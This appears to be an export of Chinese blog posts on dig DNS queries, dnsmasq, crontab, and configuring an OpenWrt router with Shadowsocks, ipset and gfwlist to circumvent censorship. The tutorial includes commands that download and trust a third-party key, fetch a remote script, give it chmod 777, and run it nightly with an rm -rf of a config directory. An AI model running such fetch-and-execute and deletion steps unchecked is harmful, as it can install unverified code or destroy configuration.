62175 IN NS ns1.sina.com.cn.weibo.com. 62175 IN NS ns3.sina.com.cn.weibo.com. 62175 IN NS ns2.sina.com.cn.;; Query time: 18 msec;; SERVER: 192.168.16.1#53(192.168.16.1);; WHEN: Wed Jan 30 18:04:44 CST 2019;; MSG SIZE rcvd: 214 分析 status: NOERROR 表示查询没有什么错误，Query time 表示查询完成时间。 SERVER: 192.168.16.1#53(192.168.16.1)表示完成查询的DNS服务器地址和端口号。 QUESTION SECTION 表示需要查询的内容。 ANSWER SECTION 表示查询结果，返回 A 记录的 IP 地址。180 表示本次查询缓存时间，在 180 秒本地 DNS 服务器可以直接从缓存返回结果。 AUTHORITY SECTION 表示从哪台 DNS 服务器获取到具体的 A 记录信息。因为，本地 DNS 服务器只是查询，而 AUTHORITY SECTION 返回的服务器是权威 DNS 服务器，由它来维护 www.weibo.com 的域名信息。返回的 DNS 记录类型是 NS，对应的名称是 ns4.sina.com.cn，ns4.sina.com等等。 指定DNS解析服务器通过@DNS服务器，可以指定向特定DNS服务器查询，比如 1234567891011121314151617181920212223$ dig @114.114.114.114 www.weibo.com; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @114.114.114.114 www.weibo.com; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 46369;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;www.weibo.com. IN A;; ANSWER SECTION:www.weibo.com. 42 IN A 180.149.134.142www.weibo.com. 42 IN A 180.149.134.141www.weibo.com. 42 IN A 180.149.138.56;; Query time: 42 msec;; SERVER: 114.114.114.114#53(114.114.114.114);; WHEN: Wed Jan 30 17:53:16 CST 2019;; MSG SIZE rcvd: 90 查询指定类型常见 DNS 记录的类型 类型 目的 A 地址记录，用来指定域名的 IPv4 地址，如果需要将域名指向一个 IP 地址，就需要添加 A 记录。 AAAA 用来指定主机名(或域名)对应的 IPv6 地址记录。 CNAME 如果需要将域名指向另一个域名，再由另一个域名提供 ip 地址，就需要添加 CNAME 记录。 MX 如果需要设置邮箱，让邮箱能够收到邮件，需要添加 MX 记录。 NS 域名服务器记录，如果需要把子域名交给其他 DNS 服务器解析，就需要添加 NS 记录。 SOA SOA 这种记录是所有区域性文件中的强制性记录。它必须是一个文件中的第一个记录。 TXT 可以写任何东西，长度限制为 255。绝大多数的 TXT记录是用来做 SPF 记录(反垃圾邮件)。 ANY、A、MX、SIG，以及任何有效查询类型等。如果不提供任何类型参数，dig 将对纪录 A 执行查询。 12345678910111213141516171819202122$ dig www.weibo.com ANY; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; www.weibo.com ANY;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 11051;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;www.weibo.com. IN ANY;; ANSWER SECTION:www.weibo.com. 191 IN A 180.149.134.141www.weibo.com. 191 IN A 180.149.134.142www.weibo.com. 191 IN A 180.149.138.56;; Query time: 24 msec;; SERVER: 192.168.16.1#53(192.168.16.1);; WHEN: Wed Jan 30 17:59:32 CST 2019;; MSG SIZE rcvd: 90 指定服务端口默认请求的是它的53端口，我们还可以通过-p指定特定的DNS查询端口。 比如： 我们希望向192.168.16.1的5353端口请求DNS服务（而不是向默认的192.168.16.1的53端口）。 123456789101112131415161718192021$ dig @192.168.16.1 -p 5353 www.google.com; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @192.168.16.1 -p 5353 www.google.com; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 240;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 512;; QUESTION SECTION:;www.google.com. IN A;; ANSWER SECTION:www.google.com. 278 IN A 216.58.197.100;; Query time: 52 msec;; SERVER: 192.168.16.1#5353(192.168.16.1);; WHEN: Wed Jan 30 17:56:15 CST 2019;; MSG SIZE rcvd: 59 跟踪整个查询过程如果你好奇 dig 命令执行查询时都经历了哪些过程，你可以尝试使用 +trace 选项。它会输出从根域到最终结果的所有信息： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152$ dig www.weibo.com +trace; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; www.weibo.com +trace;; global options: +cmd. 59443 IN NS f.root-servers.net.. 59443 IN NS g.root-servers.net.. 59443 IN NS h.root-servers.net.. 59443 IN NS i.root-servers.net.. 59443 IN NS j.root-servers.net.. 59443 IN NS k.root-servers.net.. 59443 IN NS l.root-servers.net.. 59443 IN NS m.root-servers.net.. 59443 IN NS a.root-servers.net.. 59443 IN NS b.root-servers.net.. 59443 IN NS c.root-servers.net.. 59443 IN NS d.root-servers.net.. 59443 IN NS e.root-servers.net.;; Received 1097 bytes from 192.168.16.1#53(192.168.16.1) in 17 mscom. 172800 IN NS a.gtld-servers.net.com. 172800 IN NS b.gtld-servers.net.com. 172800 IN NS c.gtld-servers.net.com. 172800 IN NS d.gtld-servers.net.com. 172800 IN NS e.gtld-servers.net.com. 172800 IN NS f.gtld-servers.net.com. 172800 IN NS g.gtld-servers.net.com. 172800 IN NS h.gtld-servers.net.com. 172800 IN NS i.gtld-servers.net.com. 172800 IN NS j.gtld-servers.net.com. 172800 IN NS k.gtld-servers.net.com. 172800 IN NS l.gtld-servers.net.com. 172800 IN NS m.gtld-servers.net.;; Received 1176 bytes from 192.5.5.241#53(f.root-servers.net) in 46 msweibo.com. 172800 IN NS ns1.sina.com.cn.weibo.com. 172800 IN NS ns2.sina.com.cn.weibo.com. 172800 IN NS ns3.sina.com.cn.weibo.com. 172800 IN NS ns4.sina.com.cn.weibo.com. 172800 IN NS ns4.sina.com.weibo.com. 172800 IN NS ns3.sina.com.;; Received 683 bytes from 192.54.112.30#53(h.gtld-servers.net) in 217 mswww.weibo.com. 60 IN A 180.149.134.142www.weibo.com. 60 IN A 180.149.138.56www.weibo.com. 60 IN A 180.149.134.141weibo.com. 86400 IN NS ns3.sina.com.cn.weibo.com. 86400 IN NS ns2.sina.com.cn.weibo.com. 86400 IN NS ns3.sina.com.weibo.com. 86400 IN NS ns1.sina.com.cn.weibo.com. 86400 IN NS ns4.sina.com.cn.weibo.com. 86400 IN NS ns4.sina.com.;; Received 310 bytes from 123.125.29.99#53(ns4.sina.com) in 51 ms Reference IBM dig 命令 - https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_71/com.ibm.aix.cmds2/dig.htm DNS（二）通过dig命令理解DNS - https://www.jianshu.com/p/71f61652ec23","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Network】dnsmasq初学","date":"2019-01-30T09:28:22.000Z","path":"2019/01/30/【Network】dnsmasq/","text":"dnsmasq的简介dnsmasq 提供 DNS 缓存和 DHCP 服务功能。作为域名解析服务器(DNS)，dnsmasq可以通过缓存 DNS 请求来提高对访问过的网址的连接速度。作为DHCP 服务器，dnsmasq 可以用于为局域网电脑分配内网ip地址和提供路由。DNS和DHCP两个功能可以同时或分别单独实现。 dnsmasq配置查看配置文件语法是否正确12$ dnsmasq --testdnsmasq: syntax check OK. Debug12345678910# 关于log的几个选项# For debugging purposes, log each DNS query as it passes through# dnsmasq.log-queries # Log lots of extra information about DHCP transactions.#log-dhcp # Log to this syslog facility or file. (defaults to DAEMON)log-facility=/var/log/dnsmasq.log 指定上游DNS服务器指定单个上游DNS服务器12$ vi /etc/dnsmasq.confserver=1.1.1.1 指定多个上游DNS服务器添加all-servers的意义在于：向所有列出的上游服务器均发送DNS查询，而不是只向一个发送DNS查询。 all-servers 表示对以下设置的所有 server 发起查询，选择回应最快的一条作为查询结果返回。 123456$ vi /etc/dnsmasq.confall-serversserver=1.1.1.1server=8.8.8.8 server=1.2.4.8 server=223.5.5.5 dnsmasq的主要作用智能DNS加快解析速度智能DNS加快解析速度，打开/etc/dnsmasq.conf文件，server=后面可以添加指定的DNS，例如国内外不同的网站使用不同的DNS。 国内指定DNS server=/cn/114.114.114.114 server=/taobao.com/114.114.114.114 server=/taobaocdn.com/114.114.114.114 国外指定DNS server=/google.com/223.5.5.5 屏蔽网页广告屏蔽网页广告，将指广告的URL指定127这个IP，就可以将网页上讨厌的广告给去掉了。 address=/ad.youku.com/127.0.0.1 address=/ad.iqiyi.com/127.0.0.1 dnsmasq的解析流程dnsmasq先去解析hosts文件， 再去解析/etc/dnsmasq.d/下的*.conf文件，并且这些文件的优先级要高于dnsmasq.conf，我们自定义的resolv.dnsmasq.conf中的DNS也被称为上游DNS，这是最后去查询解析的； 如果不想用hosts文件做解析，我们可以在/etc/dnsmasq.conf中加入no-hosts这条语句，这样的话就直接查询上游DNS了，如果我们不想做上游查询，就是不想做正常的解析，我们可以加入no-reslov这条语句。 dnsmasq的参数及常用设置说明编辑 dnsmasq 的配置文件 /etc/dnsmasq.conf 。这个文件包含大量的选项注释。 dnsmasq经常修改的比较重要参数说明 具体参数 参数说明 resolv-file 定义dnsmasq从哪里获取上游DNS服务器的地址， 默认从/etc/resolv.conf获取。 strict-order 表示严格按照resolv-file文件中的顺序从上到下进行DNS解析，直到第一个解析成功为止。 listen-address 定义dnsmasq监听的地址，默认是监控本机的所有网卡上。 address 启用泛域名解析，即自定义解析a记录，例如：address=/long.com/192.168.115.10 访问long.com时的所有域名都会被解析成192.168.115.10 bogus-nxdomain 对于任何被解析到此 IP 的域名，将响应 NXDOMAIN 使其解析失效，可以多次指定**通常用于对于访问不存在的域名，禁止其跳转到运营商的广告站点** server 指定使用哪个DNS服务器进行解析，对于不同的网站可以使用不同的域名对应解析。**例如：server=/google.com/8.8.8.8 #表示对于google的服务，使用谷歌的DNS解析。** Reference dnsmasq详解及配置 - http://blog.51cto.com/longlei/2065967 Dnsmasq 进阶技巧 - https://linux.cn/article-9438-1.html 利用 Dnsmasq 部署 DNS 服务 - https://www.hi-linux.com/posts/30947.html","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Linux】定时任务","date":"2019-01-30T09:20:16.000Z","path":"2019/01/30/【Linux】定时任务/","text":"列出当前的默认计划任务列表1crontab -l 删除当前的默认计划任务列表1crontab -r 通过vim修改当前的默认计划任务列表1crontab -e 计划任务列表的格式:1[minute] [hour] [day of month] [month] [day of week] [program to be run] 其中各个参数的取值范围是: minute：0-59 hour：0-23 day of month：1-31 month：1-12 day of week：0-7，0 or 7 is Sun 每个参数里的取值可以有4种间隔符: * 表示任意 - 表示范围 , 表示枚举多个值 / 表示每隔 例如:周一到周五每天晚上23:30执行ruijieclient -k 130 23 * * 1-5 /bin/ruijieclient -k 每天每隔10分钟执行date 1*/10 * * * * date","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Network】Shadowsocks + OpenWRT + dnsmasq-full + ipset + gfwList 实现路由器（小米路由器mini）自动翻墙","date":"2019-01-30T07:46:46.000Z","path":"2019/01/30/【Network】Shadowsocks -Shadowsocks-OpenWRT-dnsmasq-full-ipset-gfwList-实现路由器（小米路由器mini）自动翻墙/","text":"注明：本 blog 仅作为技术研究讨论学习信息安全相关技术，请勿用于任何违法用途！并请严格遵命各国和地区法律！翻墙思路本方案基于gfwlist，gfwlist（ https://github.com/gfwlist/gfwlist ）中记录了已经被gfw封锁的域名（https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt）。 为了绕过GFW的DNS污染，访问处于gfwlist中列表的域名时，我们可以借助ss-tunnel通过 Shadowsocks Server 请求国外公共 DNS（如8.8.8.8，4.4.4.4）以获得干净的DNS解析结果。当然，我们也可以在国外或不被GFW投毒的地方架设DNS服务器，通过访问自己的这个DNS服务器，以获得干净的DNS解析结果。 在访问处于gfwlist中列表的域名时，在获取干净的DNS解析结果后，我们还需要通过ss-redir来与这个目标主机建立Socket连接，以逃避GFW的TCP RST重置。 gfwlist中的域名站点走代理，不在List中的域名不走代理。本质上依然是根据目标主机的IP来进行判断。dnsmasq-full可以将解析域名得到的IP加到一个ipset中，最终利用这个ipset来判断走不走代理。实际是完成了gfwlist（域名列表）到dnsmasq的ipset规则再到IP地址的转换。 本方案的优点明确，只有被墙的站点才走代理。但是，虽然gfwlist每天都在不停的更新，但是gfwlist并不能100%涵盖被墙站点，而且有些国外站点直连速度远不如走代理，特别是你代理服务器速度较快，希望通过代理加速国外访问时，此方案就存在一定的不足。 作为本方案的弥补，我选择在PC上安装SwitchyOmega。当访问被墙而又不在gfwlist列表中网站，或者直接访问非常非常慢的国外站点时，使用手动切换为全局走ss的策略。 因此，对于在gfwlist中的网站走ss（黑名单机制），通过http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest 实现一定在国内的网站直接访问（白名单机制）。 分析iptables只能根据IP地址定义规则进行转发，不能识别域名，而dnsmasq-full不仅可以实现域名-IP的映射，还可以把这个映射关系存储在ipset中，所以使用dnsmasq-full+ipset就可以实现iptables对域名的转发，可以实现很多功能。 具体来说，当dnsmasq-full接收到一个DNS查询请求，首先匹配配置文件中的域名列表（对应于gfwlist），如果匹配成功某域名，就把IP的查询结果存储在一个ipset集合中， 此后iptables就可以使用ipset中的这个IP集合，即若客户端访问这个集合中的某个IP时，就进行相应的处理（比如DROP或者REDIRECT）。 在我们的翻墙场景中，比如用户访问www.google.com ，dnsmasq-full查询gfwlist，发现这个域名在其中，则在（通过ss-tunnel）进行DNS解析后（绕过了GFW的DNS污染），把其对应的IP存入ipset中。当此后用户尝试与www.google.com 对应的IP建立连接时，iptables将这个TCP连接重定向到ss中，最终绕过了GFW的TCP RST攻击。 刷入最新的OpenWrt 这里踩坑了，本来我的小米路由器mini一致使用PandoraBox固件（PandoraBox-ralink-mt7620-xiaomi-mini-squashfs-sysupgrade-r1024-20150608）。下载地址：http://downloads.openwrt.org.cn/PandoraBox/Xiaomi-Mini-R1CM/stable/ 。而由于PandoraBox不支持opkg-key命令（在下面会使用到），shadowsocks不能自动安装。最终折腾上了最新的OpenWrt。 首先路由器型号需要在OpenWrt支持的列表中：http://wiki.openwrt.org/toh/start/ (可以ctrl+F搜索匹配型号)，并记录所用路由器CPU的型号。 下载并安装OpenWrt从downloads.openwrt.org，下载最新的OpenWrt ROM，当前（2019.1.29）最新的OpenWrt版本为18.06.1。 下载地址：https://downloads.openwrt.org/releases/18.06.1/targets/ramips/mt7620/openwrt-18.06.1-ramips-mt7620-miwifi-mini-squashfs-sysupgrade.bin。 并刷入这个OpenWrt固件到路由器中。 查询信息查看OpenWrt版本12[root@PandoraBox:/root]#cat /proc/versionLinux version 3.14.44 (lintel@PandoraBox-Server) (gcc version 4.8.3 (PandoraBox/Linaro GCC 4.8-2014.04 r969) ) #7 Mon Jun 8 22:23:15 CST 2015 查看CPU信息我使用的是小米路由器mini，其CPU为MTK MT7620A 单核580MHz。 123456789101112131415161718[root@PandoraBox:/mnt/sda1]#cat /proc/cpuinfosystem type : MediaTek MT7620machine : Xiaomi mini Boardprocessor : 0cpu model : MIPS 24KEc V5.0BogoMIPS : 385.84wait instruction : yesmicrosecond timers : yestlb_entries : 32extra interrupt vector : yeshardware watchpoint : yes, count: 4, address/irw mask: [0x0ffc, 0x0ffc, 0x0ffb, 0x0ffb]isa : mips1 mips2 mips32r2ASEs implemented : mips16 dspshadow register sets : 1kscratch registers : 0core : 0VCED exceptions : not availableVCEI exceptions : not available 查看当前路由器的架构1$ opkg print-architecture | awk '&#123;print $2&#125;' #安装Shadowsocks及依赖应用 建议所有安装与配置操作都在控制台下完成，如通过OpenWrt的luci操作，有可能出现未获得预期效果后不好调试的问题。 说明shadowsocks-libev：官方原版，包含 ss-{local,redir,tunnel}默认启动 ss-local， 以对外提供 SOCKS5 代理，其中 ss-redir 建立透明代理 ss-rules 生成代理规则 ss-tunnel 提供 UDP 转发 shadowsocks-libev-spec：针对 OpenWrt 的优化版本，包含 ss-{redir,rules,tunnel}。从 v1.5.2 开始可以使用 LuCI 配置界面。 SSL依赖说明shadowsocks-libev-spec依赖于SSL，根据依赖的 SSL 库可分为 OpenSSL 和 PolarSSL 两种版本： OpenSSL 版依赖 libopenssl, 支持加密方式多, 体积大 PolarSSL 版依赖 libpolarssl, 体积小, 加密方式少 两种版本使用上并无差异，根据ROM中预装的 SSL 库选择即可。 添加第三方源（openwrt-dist）添加 openwrt-dist.pub 到opkg的 keys 中。只有这样，第三方的包才能通过签名验证： 12$ wget http://openwrt-dist.sourceforge.net/openwrt-dist.pub$ opkg-key add openwrt-dist.pub 获取路由器对应的架构（architecture）： 1$ opkg print-architecture | awk '&#123;print $2&#125;' 请根据自己的CPU架构（可以执行 opkg print-architecture 查看），将厦门的{architecture}替换成相应的文本。 添加以下源到 /etc/opkg/customfeeds.conf： 12src/gz openwrt_dist http://openwrt-dist.sourceforge.net/packages/base/&#123;architecture&#125;src/gz openwrt_dist_luci http://openwrt-dist.sourceforge.net/packages/luci 更新最新opkg源信息： 1$ opkg update 卸载dnsmasq并安装dnsmasq-full这里踩坑了！！之前我安装的是最新的dnsmasq（2.80）版本，通过dnsmasq -v也能看到其已经支持了ipset。 然而，若在/etc/dnsmasq.d/dnsmasq_gfwlist_ipset.conf 中放入ipset=/xx.com/gfwlist时，则会出现&quot;dnsmasq: recompile with HAVE_IPSET defined to enable ipset directives&quot;的错误。显然在重新对dnsmasq进行编译前，dnsmasq仍然不能有效支持ipset。 最终决定卸载dnsmasq并安装dnsmasq-full。 执行： 1$ opkg remove dnsmasq &amp;&amp; opkg install dnsmasq-full 注意，由于dnsmasq默认负责路由器的DNS解析和DHCP分配工作。因此在卸载了dnsmasq后，opkg install 可能会因为无法获得DNS解析工作而无法正常执行。 一个解决办法可以是，进入OpenWrt的GUI界面，进入[Network] - [Interfaces] - [WAN Edit]，进入[Advanced Settings]，修改Use custom DNS servers为114.114.114.114。 在路由器的控制台中ping一下baidu.com（ping baidu.com），若可以正常ping通，则说明当前DNS工作正常。opkg install也当然可以正常工作。 还有一个方法，在网络正常的机器上，执行 ping 到一个源（比如，downloads.openwrt.org或者mirrors.ustc.edu.cn）。在获得其IP后，修改 /etc/opkg/distfeeds.conf将其域名替换为对应IP，以避免无法获得DNS解析而导致的opkg install无法正常执行的情况。 安装shadowsocks-libev-spec1234$ opkg install shadowsocks-libev luci-app-shadowsocks$ opkg install ipset libpthread# ChinaDNS在此方案中不会被使用到$ opkg install ChinaDNS luci-app-chinadns 以上为直接从第三方源（openwrt-dist）下载并安装shadowsocks-libev及其依赖。 但事实上，有可能在已经添加了第三方源（openwrt-dist）后，进行opkg update时，提示以下连接错误： 12345678$ opkg updateDownloading http://openwrt-dist.sourceforge.net/packages/base/mipsel_24kc/Packages.gzFailed to establish connection*** Failed to download the package list from http://openwrt-dist.sourceforge.net/packages/base/mipsel_24kc/Packages.gzDownloading http://openwrt-dist.sourceforge.net/packages/luci/Packages.gzFailed to establish connection*** Failed to download the package list from http://openwrt-dist.sourceforge.net/packages/luci/Packages.gz 个人主观推测，有可能是GFW对openwrt-dist.sourceforge.net的访问进行的干扰。因此，你也可以直接访问https://dl.bintray.com/aa65535/opkg/shadowsocks-libev/或者https://github.com/shadowsocks/openwrt-shadowsocks/releases下载最新的二进制版（binary）。当然，你也可以下载源代码来直接编译。 然后通过scp命令从本机将.ipa拷贝到路由器上，再通过opkg install shadowsocks-libev_3.2.5-1_mipsel_24kc.ipk完成安装。 配置Shadowsocks配置文件配置 /etc/shadowsocks.json ，格式如下： 12345678910&#123; \"server\": \"...\", \"server_port\": 21122, \"local_address\": \"0.0.0.0\", \"local_port\": 1080, \"password\": \"...\", \"method\": \"chacha20-ietf-poly1305\", \"mode\": \"tcp_and_udp\", \"fast_open\": true&#125; 请自行修改好服务器IP、端口号、密码、加密方式。 新建执行文件新建文件： /etc/init.d/shadowsocks ： 123456789101112131415161718192021222324252627282930313233343536#!/bin/sh /etc/rc.common START=95 SERVICE_DAEMONIZE=1CONFIG=/etc/shadowsocks.jsonDNS=8.8.8.8:53TUNNEL_PORT=5353 start() &#123; # 由于在每次路由器重启后，ipset都会被清空 ipset -N gfwlist iphash iptables -t nat -A PREROUTING -p tcp -m set --match-set gfwlist dst -j REDIRECT --to-port 1080 iptables -t nat -A OUTPUT -p tcp -m set --match-set gfwlist dst -j REDIRECT --to-port 1080 iptables -t nat -A OUTPUT -p udp --dport 443 -j REDIRECT --to-ports 1080 iptables -t nat -A PREROUTING -p udp --dport 443 -j REDIRECT --to-ports 1080 # Proxy Mode service_start /usr/bin/ss-redir -c $CONFIG -b 0.0.0.0 -u # Tunnel service_start /usr/bin/ss-tunnel -c $CONFIG -b 0.0.0.0 -u -l $TUNNEL_PORT -L $DNS&#125; stop() &#123; # Solve &quot;Set cannot be destroyed: it is in use by a kernel component&quot; service firewall stop ipset destroy gfwlist # Proxy Mode service_stop /usr/bin/ss-redir # Tunnel service_stop /usr/bin/ss-tunnel # Restart the firewall service firewall start&#125; 修改文件权限： 1$ chmod +x /etc/init.d/shadowsocks 然后启动shadowsocks，并设置开机运行： 12$ /etc/init.d/shadowsocks enable$ /etc/init.d/shadowsocks start 最后检查一下是否正常启动了： 1$ netstat -lnp | grep ss-redir 如果未能正确启动，尝试手动执行，看看报什么错： 1$ ss-redir -c /etc/shadowsocks.json -b 0.0.0.0 -v 开启 TCP Fast Open （TCP快速打开，缩略为TFO） 要求： 系统内核版本≥3.7，shadowsocks-libev≥3.0.4，shadowsocks服务端开启tcp fast open。 通过echo &quot;net.ipv4.tcp_fastopen = 3&quot; &gt; /etc/sysctl.conf修改 /etc/sysctl.conf ，以加入如下一行： 1net.ipv4.tcp_fastopen = 3 执行如下命令使之生效： 1$ sysctl -p 配置ipset、iptables和dnsmasq-full配置ipset和iptables 如果希望深入了解iptables，可以访问【Linux】iptables 防火墙。 在控制台输入以添加如下规则（–to-port后的1080是我设置的路由器提供shadowsocks服务的本地端口，你需要根据具体情况修改）： 12345678910111213141516171819202122# 在ipset中建立一个名为gfwlist的ip哈希表$ ipset -N gfwlist iphash$ iptables -t nat -N SHADOWSOCKS# 若tcp请求位于gfwlist中的ip，则重定向到shadowsocks走代理$ iptables -t nat -A PREROUTING -p tcp -m set --match-set gfwlist dst -j REDIRECT --to-port 1080$ iptables -t nat -A OUTPUT -p tcp -m set --match-set gfwlist dst -j REDIRECT --to-port 1080$ iptables -t nat -A OUTPUT -p udp --dport 443 -j REDIRECT --to-ports 1080$ iptables -t nat -A PREROUTING -p udp --dport 443 -j REDIRECT --to-ports 1080# x.x.x.x为shadowsocks服务器地址$ iptables -t nat -A shadowsocks -d x.x.x.x -j RETURN $ iptables -t nat -A shadowsocks -d 0.0.0.0/8 -j RETURN$ iptables -t nat -A shadowsocks -d 10.0.0.0/8 -j RETURN$ iptables -t nat -A shadowsocks -d 127.0.0.0/8 -j RETURN$ iptables -t nat -A shadowsocks -d 169.254.0.0/16 -j RETURN$ iptables -t nat -A shadowsocks -d 172.16.0.0/12 -j RETURN$ iptables -t nat -A shadowsocks -d 192.168.0.0/16 -j RETURN$ iptables -t nat -A shadowsocks -d 224.0.0.0/4 -j RETURN$ iptables -t nat -A shadowsocks -d 240.0.0.0/4 -j RETURN 配置dnsmasq-full执行 1$ echo \"conf-dir=/etc/dnsmasq.d\" &gt;&gt; /etc/dnsmasq.conf 以在 /etc/dnsmasq.conf 的最后加入 conf-dir=/etc/dnsmasq.d 添加gfwlist新建并进入目录 /etc/dnsmasq.d ，从 https://cokebar.github.io/gfwlist2dnsmasq/dnsmasq_gfwlist_ipset.conf 下载 dnsmasq_gfwlist_ipset.conf 后放入该目录。 cokebar大神写了一个将gfwlist转换成包含ipset的dnsmasq-full格式的工具（https://github.com/cokebar/gfwlist2dnsmasq）。 我们也可以根据自己的情况自行修改这个文件，格式如下： 1234#使用不受污染干扰的DNS解析该域名 可以将此IP改为自己使用的DNS服务器server=/google.com/127.0.0.1#5353#将解析出来的IP保存到名为gfwlist的ipset表中ipset=/google.com/gfwlist 设置默认的DNS进入OpenWrt的GUI界面，进入[Network] - [Interfaces] - [WAN Edit]，进入[Advanced Settings]，修改Use custom DNS servers为127.0.0.1。 这意味着，连接该OpenWrt路由器的所有设备发出的DNS请求都会由该路由器的dnsmasq来响应（当然，前提是设备没有手动去修改默认的DNS服务器IP，而使用路由器默认提供的DNS服务器IP）。 在[Network] - [DHCP and DNS]中，设置DNS forwardings为114.114.114.114。注意，此为路由器默认查询的DNS服务器，你可以根据你的实际情况选择一个较快的DNS服务器（在我的情况中，我认为114.114.114.114最快）。 当这个配置修改生效后，通过 cat /var/etc/dnsmasq.conf.* 可以看到对应的 dnsmasq 的配置文件也发生了变化，如下图： 自动更新gfwlistgfwlist2dnsmasq需要通过SSL下载gfwlist，而OpenWrt安装的busybox wget，并不支持SSL，因此我们需要安装libustream-mbedtls、 ca-certificates和ca-bundle。除此之外，gwflist使用BASE64编码，因此base64需要被安装： 123$ opkg update$ opkg install libustream-mbedtls coreutils-base64$ opkg install ca-certificates ca-bundle 下载gfwlist2dnsmasq.sh： 1$ wget https://raw.githubusercontent.com/cokebar/gfwlist2dnsmasq/master/gfwlist2dnsmasq.sh 为gfwlist2dnsmasq.sh增加执行权限： 1$ chmod 777 /root/gfwlist2dnsmasq.sh 执行crontab –e建立一个定期执行任务，并将以下代码复制。 12340 1 * * * sh /root/gfwlist2dnsmasq.sh -p 5353 -s gfwlist -o /root/dnsmasq_gfwlist_ipset_`date &quot;+%Y-%m-%d&quot;`.conf \\&amp;&amp; rm -rf /etc/dnsmasq.d/* \\&amp;&amp; cp /root/dnsmasq_gfwlist_ipset_`date &quot;+%Y-%m-%d&quot;`.conf /etc/dnsmasq.d/ \\&amp;&amp; /etc/init.d/dnsmasq restart 常见诊断防火墙设置 使用 service firewall stop命令关闭服务器的防火墙排查是否防火墙挡住了请求。 使用 iptables -t nat -L -n查看nat表中的所有规则。 dnsmasq配置dnsmasq --test 查看dnsmasq配置是否正确。 /etc/init.d/dnsmasq restart重启dnsmasq服务。 使用top查看当前dnsmasq是否启动，且正常使用的配置文件路径。由于默认情况下，Openwrt允许我们通过Luci在界面上配置dnsmasq，因此Luci会自动生成一个dnsmasq配置文件（默认位于/var/etc/dnsmasq.conf.*）。通过top可以看到这个生成的配置文件的准确路径 ipsetipset list gfwlist查看ipset中我们定义的gfwlist中包含的所有记录。 ShadowsocksShadowsocks是否已经启动检查ss是否正常运行netstat -anptl |grep ss|grep LISTEN： Shadowsocks输出log使用-v以让Shadowsocks记录log到指定文件： 12$ /usr/bin/ss-redir -c /etc/shadowsocks.json -b 0.0.0.0 -u -v 1&gt;&gt;/var/log/ss-redir &amp;$ /usr/bin/ss-tunnel -c /etc/shadowsocks.json -b 0.0.0.0 -u -l 5353 -L 8.8.8.8:53 -v 1&gt;&gt;/var/log/ss-tunnel.log &amp; 检查Shadowsocks中的ss-tunnel是否提供正确的DNS解析你可以通过以下方式，在连接到Openwrt的主机上测试，是否可以正常通过ss-tunnel连接到Shadowsocks Server以获得未被污染的DNS解析结果： 首先在Openwrt上手动启动ss-tunnel： 1$ /usr/bin/ss-tunnel -c /etc/shadowsocks.json -b 192.168.16.1 -u -l 5353 -L 8.8.8.8:53 -v 1&gt;&gt;/var/log/ss-tunnel.log &amp; 在主机上向Openwrt上的ss-tunnel请求DNS解析服务，注意我的Openwrt IP为192.168.16.1，ss-tunnel运行在5353端口下，你要根据实际情况修改： 1$ dig @192.168.16.1 -p 5353 www.google.com 以下是ss-tunnel的日志： 1234567892019-06-19 10:45:00 INFO: initializing ciphers... chacha20-ietf-poly13052019-06-19 10:45:00 INFO: listening at 192.168.16.1:53532019-06-19 10:45:00 INFO: UDP relay enabled2019-06-19 10:45:04 INFO: [udp] server receive a packet2019-06-19 10:45:04 INFO: [53] [udp] cache miss: 8.8.8.8:53 &lt;-&gt; 192.168.16.222:494912019-06-19 10:45:09 INFO: [udp] server receive a packet2019-06-19 10:45:09 INFO: [53] [udp] cache hit: 8.8.8.8:53 &lt;-&gt; 192.168.16.222:494912019-06-19 10:45:14 INFO: [udp] server receive a packet2019-06-19 10:45:14 INFO: [53] [udp] cache hit: 8.8.8.8:53 &lt;-&gt; 192.168.16.222:49491 DNS配置增加以下内容到/etc/dnsmasq.conf的尾部： 12345# For debugging purposes, log each DNS query as it passes through dnsmasq.log-queries# Log to this syslog facility or file. (defaults to DAEMON)log-facility=/var/log/dnsmasq.log 重启dnsmasq： 1$ /etc/init.d/dnsmasq restart 使用以下命令可以实时查看dnsmasq的工作日志： 1$ tail -f /var/log/dnsmasq.log Openwrt的dig安装123$ opkg update$ opkg install bind-dig$ dig baidu.com 可用于检测当前路由器上的DNS服务是否正常。 shadowsocks测速https://lvii.gitbooks.io/outman/content/speed_test.html Reference Shaowsocks + GfwList 实现 OpenWRT / LEDE 路由器自动翻墙 - https://cokebar.info/archives/962 https://github.com/softwaredownload/openwrt-fanqiang 打造一台翻墙路由器 - https://github.com/MichaelXue/blog 最好的 